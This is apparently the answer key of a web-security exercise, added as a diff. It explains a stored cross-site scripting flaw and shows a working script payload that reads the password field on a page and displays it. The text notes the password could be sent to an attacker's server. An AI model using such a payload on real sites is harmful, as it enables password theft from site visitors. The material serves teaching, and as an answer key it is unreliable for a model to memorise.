@@ -1,0 +1,22 @@
+# BEGIN_SOLUTION
+
+JavaScript in comments will be executed. For example, the following JavaScript code
+will print the password every time a user visits the website. Instead of printing,
+the password could just as well be sent to an attacker-controlled server to be used
+for nefarious purposes.
+
+    <script>
+    function loop(){
+        var inputs = document.getElementsByName("password");
+        if (inputs.length > 0){
+            alert("Your password is: " + inputs[0].value);
+        }
+        setTimeout(loop, 1000);
+    }
+    loop()
+    </script>
+
+An attacker just has to post a comment containing the JavaScript code above to steal passwords.
+
+# END_SOLUTION
+
